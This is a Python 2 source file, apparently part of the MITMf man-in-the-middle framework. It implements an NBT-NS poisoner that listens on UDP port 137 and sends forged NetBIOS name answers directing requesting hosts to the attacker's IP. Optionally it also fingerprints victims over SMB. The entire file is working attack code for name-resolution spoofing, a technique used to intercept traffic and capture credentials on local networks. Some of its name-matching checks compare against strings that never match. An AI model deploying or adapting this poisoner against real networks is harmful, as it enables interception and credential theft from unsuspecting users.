#! /usr/bin/env python2.7

import threading
import socket
import struct
import logging
import string

from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
from core.configwatcher import ConfigWatcher
from core.responder.fingerprinter.Fingerprint import RunSmbFinger
from core.responder.odict import OrderedDict
from core.responder.packet import Packet
from core.responder.common import *

mitmf_logger = logging.getLogger("mitmf")

class NBTNSPoisoner():

	def start(self, options, ourip):

		global OURIP; OURIP = ourip
		global args; args = options

		try:
			mitmf_logger.debug("[NBTNSPoisoner] OURIP => {}".format(ourip))
			server = ThreadingUDPServer(("0.0.0.0", 137), NB)
			t = threading.Thread(name="NBTNSPoisoner", target=server.serve_forever)
			t.setDaemon(True)
			t.start()
		except Exception, e:
			mitmf_logger.debug("[NBTNSPoisoner] Error starting on port 137: {}".format(e))

class ThreadingUDPServer(ThreadingMixIn, UDPServer):

	allow_reuse_address = 1

	def server_bind(self):
		UDPServer.server_bind(self)

#NBT-NS answer packet.
class NBT_Ans(Packet):
	fields = OrderedDict([
		("Tid",           ""),
		("Flags",         "\x85\x00"),
		("Question",      "\x00\x00"),
		("AnswerRRS",     "\x00\x01"),
		("AuthorityRRS",  "\x00\x00"),
		("AdditionalRRS", "\x00\x00"),
		("NbtName",       ""),
		("Type",          "\x00\x20"),
		("Classy",        "\x00\x01"),
		("TTL",           "\x00\x00\x00\xa5"),
		("Len",           "\x00\x06"),
		("Flags1",        "\x00\x00"),
		("IP",            "\x00\x00\x00\x00"),
	])

	def calculate(self,data):
		self.fields["Tid"] = data[0:2]
		self.fields["NbtName"] = data[12:46]
		self.fields["IP"] = socket.inet_aton(OURIP)

def NBT_NS_Role(data):
	Role = {
		"\x41\x41\x00":"Workstation/Redirector Service",
		"\x42\x4c\x00":"Domain Master Browser",
		"\x42\x4d\x00":"Domain controller service",
		"\x42\x4e\x00":"Local Master Browser",
		"\x42\x4f\x00":"Browser Election Service",
		"\x43\x41\x00":"File Server Service",
		"\x41\x42\x00":"Browser Service",
	}

	if data in Role:
		return Role[data]
	else:
		return "Service not known."

# Define what are we answering to.
def Validate_NBT_NS(data,Wredirect):
	if args.analyze:
		return False

	if NBT_NS_Role(data[43:46]) == "File Server Service.":
		return True

	if args.nbtns == True:
		if NBT_NS_Role(data[43:46]) == "Domain controller service. This name is a domain controller.":
			return True

	if Wredirect == True:
		if NBT_NS_Role(data[43:46]) == "Workstation/Redirector Service.":
			return True

	else:
		return False

def Decode_Name(nbname):
	#From http://code.google.com/p/dpkt/ with author's permission.
	try:
		if len(nbname) != 32:
			return nbname
		l = []
		for i in range(0, 32, 2):
			l.append(chr(((ord(nbname[i]) - 0x41) << 4) |
					   ((ord(nbname[i+1]) - 0x41) & 0xf)))
		return filter(lambda x: x in string.printable, ''.join(l).split('\x00', 1)[0].replace(' ', ''))
	except Exception, e:
		mitmf_logger.debug("[NBTNSPoisoner] Error parsing NetBIOS name: {}".format(e))
		return "Illegal NetBIOS name"

# NBT_NS Server class.
class NB(BaseRequestHandler):

	def handle(self):

		ResponderConfig   = ConfigWatcher.getInstance().getConfig()['Responder']
		DontRespondTo     = ResponderConfig['DontRespondTo']
		DontRespondToName = ResponderConfig['DontRespondToName']
		RespondTo         = ResponderConfig['RespondTo']
		RespondToName     = ResponderConfig['RespondToName']

		data, socket = self.request
		Name = Decode_Name(data[13:45])

		if DontRespondToSpecificHost(DontRespondTo):
			if RespondToIPScope(DontRespondTo, self.client_address[0]):
				return None

		if DontRespondToSpecificName(DontRespondToName) and DontRespondToNameScope(DontRespondToName.upper(), Name.upper()):
			return None 

		if args.analyze:
			if data[2:4] == "\x01\x10":
				if args.finger:
					try:
						Finger = RunSmbFinger((self.client_address[0],445))
						mitmf_logger.warning("[NBTNSPoisoner] {} is looking for: {} | Service requested: {} | OS: {} | Client Version: {}".format(self.client_address[0], Name,NBT_NS_Role(data[43:46]),Finger[0],Finger[1]))
					except Exception:
						mitmf_logger.warning("[NBTNSPoisoner] {} is looking for: {} | Service requested is: {}".format(self.client_address[0], Name, NBT_NS_Role(data[43:46])))
				else:
					mitmf_logger.warning("[NBTNSPoisoner] {} is looking for: {} | Service requested is: {}".format(self.client_address[0], Name, NBT_NS_Role(data[43:46])))

		if RespondToSpecificHost(RespondTo) and args.analyze == False:
			if RespondToIPScope(RespondTo, self.client_address[0]):
				if data[2:4] == "\x01\x10":
					if Validate_NBT_NS(data,args.wredir):
						if RespondToSpecificName(RespondToName) == False:
							buff = NBT_Ans()
							buff.calculate(data)
							for x in range(1):
								socket.sendto(str(buff), self.client_address)
								mitmf_logger.warning('[NBTNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0], Name))
								if args.finger:
									try:
										Finger = RunSmbFinger((self.client_address[0],445))
										mitmf_logger.info("[NBTNSPoisoner] OS: {} | ClientVersion: {}".format(Finger[0],Finger[1]))
									except Exception:
										mitmf_logger.info('[NBTNSPoisoner] Fingerprint failed for host: %s'%(self.client_address[0]))
										pass
						if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
							buff = NBT_Ans()
							buff.calculate(data)
							for x in range(1):
								socket.sendto(str(buff), self.client_address)
								mitmf_logger.warning('[NBTNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0], Name))
								if args.finger:
									try:
										Finger = RunSmbFinger((self.client_address[0],445))
										mitmf_logger.info("[NBTNSPoisoner] OS: {} | ClientVersion: {}".format(Finger[0],Finger[1]))
									except Exception:
										mitmf_logger.info('[NBTNSPoisoner] Fingerprint failed for host: %s'%(self.client_address[0]))
										pass
						else:
							pass
			else:
				pass

		else:
			if data[2:4] == "\x01\x10":
				if Validate_NBT_NS(data,args.wredir) and args.analyze == False:
					if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
						buff = NBT_Ans()
						buff.calculate(data)
						for x in range(1):
							socket.sendto(str(buff), self.client_address)
						mitmf_logger.warning('[NBTNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0], Name))
						if args.finger:
							try:
								Finger = RunSmbFinger((self.client_address[0],445))
								mitmf_logger.info("[NBTNSPoisoner] OS: {} | ClientVersion: {}".format(Finger[0],Finger[1]))
							except Exception:
								mitmf_logger.info('[NBTNSPoisoner] Fingerprint failed for host: %s'%(self.client_address[0]))
								pass
					if RespondToSpecificName(RespondToName) == False:
						buff = NBT_Ans()
						buff.calculate(data)
						for x in range(1):
							socket.sendto(str(buff), self.client_address)
						mitmf_logger.warning('[NBTNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0], Name))
						if args.finger:
							try:
								Finger = RunSmbFinger((self.client_address[0],445))
								mitmf_logger.info("[NBTNSPoisoner] OS: {} | ClientVersion: {}".format(Finger[0],Finger[1]))
							except Exception:
								mitmf_logger.info('[NBTNSPoisoner] Fingerprint failed for host: %s'%(self.client_address[0]))
								pass
					else:
						pass